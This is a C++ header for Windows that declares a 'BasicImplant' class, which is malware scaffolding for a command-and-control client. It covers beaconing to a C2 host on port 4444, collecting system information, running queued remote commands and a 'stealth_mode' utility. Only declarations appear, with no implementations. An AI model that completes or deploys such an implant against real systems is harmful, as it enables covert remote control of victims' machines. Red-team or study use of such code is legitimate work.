#ifndef CLIENT_H
#define CLIENT_H

#include <iostream>
#include <string>
#include <winsock2.h>




#include <iostream>
#include <winsock2.h>
//#include <ws2tcpip.h>
#include <string>
//#include <thread>
//#include <chrono>
//#include <windows.h>
//#include <lmcons.h>

#pragma comment(lib, "ws2_32.lib")

//const char* server_ip = "10.0.0.86";
//const int port = 4444;
//const char* port = "4444";



class Client
{
public:
    Client();
    Client(const char* server_ip, unsigned int port);
private:
    const char* server_ip;
    u_short port;

    char* implant_id;
    unsigned beaconInterval;
    bool running;


};

class BasicImplant {
private:
    std::string c2_host;
    int c2_port;
    std::string implant_id;
    int checkin_interval;
    bool running;
    
    // Private helper methods
    std::string get_username();
    std::string get_architecture(SYSTEM_INFO& sys_info);
    std::string get_os_version(OSVERSIONINFOA& os_info);
    void parse_response(const std::string& response);
    void execute_queued_command(const std::string& command);
    
public:
    // Constructor/Destructor
    BasicImplant(const std::string& host = "127.0.0.1", int port = 4444);
    ~BasicImplant();
    
    // Core functionality
    std::string get_system_info();
    std::string execute_command(const std::string& command);
    std::string send_to_c2(const std::string& message);
    void process_c2_commands(const std::string& response);
    void beacon();
    void stop();
    
    // Getters
    std::string get_implant_id() const { return implant_id; }
    std::string get_c2_host() const { return c2_host; }
    int get_c2_port() const { return c2_port; }
    int get_checkin_interval() const { return checkin_interval; }
    
    // Setters
    void set_checkin_interval(int interval) { checkin_interval = interval; }
};

// Utility functions
namespace ImplantUtils {
    void stealth_mode();
    std::string generate_implant_id();
    std::string format_message(const std::string& implant_id, 
                              const std::string& command, 
                              const std::string& data = "");
    std::string url_encode(const std::string& value);
    void sleep_seconds(int seconds);
}

#endif // CLIENT_H